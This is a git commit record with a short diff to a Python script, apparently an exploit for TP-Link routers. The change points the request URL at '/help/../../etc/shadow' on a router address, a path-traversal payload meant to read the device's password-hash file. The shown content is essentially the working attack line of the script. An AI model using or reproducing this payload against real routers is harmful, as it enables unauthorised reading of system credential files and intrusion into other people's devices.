7c9eb4fee5ea0e67fd3ee17c4d63ffe9b3bcefb7
Humberto Jr - Macbook <halencarjunior@gmail.com>
2016-12-09 17:33:38 -0300

    Version TP-Link 2 0.01

--- tplink2.py
+++ tplink2.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import urllib.request 
-url = 'http://192.168.1.2/'
+url = 'http://192.168.1.2/help/../../etc/shadow'
 user_agent = 'Mozilla/5.0 (Windows NT 6.1; WIN64; x64)'
 header = {'User-Agent' : user_agent}
 #req = Request(url)
